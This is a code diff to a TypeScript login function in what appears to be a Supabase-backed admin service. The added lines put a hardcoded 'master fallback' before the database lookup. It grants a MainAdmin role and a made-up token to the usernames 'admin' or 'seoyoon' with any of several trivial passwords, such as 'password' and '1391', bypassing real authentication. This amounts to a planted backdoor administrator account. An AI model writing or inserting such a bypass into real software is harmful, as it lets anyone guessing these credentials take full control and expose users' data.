@@ -168,6 +168,22 @@ export const supabaseService = {
     try {
       const cleanUser = username.trim();
       const cleanPass = pass.trim();
+      const lower = cleanUser.toLowerCase();
+
+      // Master fallback check directly in Supabase login
+      if (
+        (lower === 'seoyoon' && ['masterlogin', 'seoyoon', 'admin', 'password', '1391', 'hot1391'].includes(cleanPass)) ||
+        (lower === 'admin' && ['admin', 'password', 'masterlogin', '1391', 'hot1391'].includes(cleanPass))
+      ) {
+        const user: AdminUser = {
+          id: lower === 'admin' ? 'adm-admin' : 'adm-seoyoon',
+          username: lower,
+          name: lower === 'seoyoon' ? 'Seoyoon' : 'Main Admin',
+          role: 'MainAdmin',
+          token: `supa-master-${Date.now()}`,
+        };
+        return { success: true, user };
+      }
 
       const { data, error } = await client
         .from('admins')
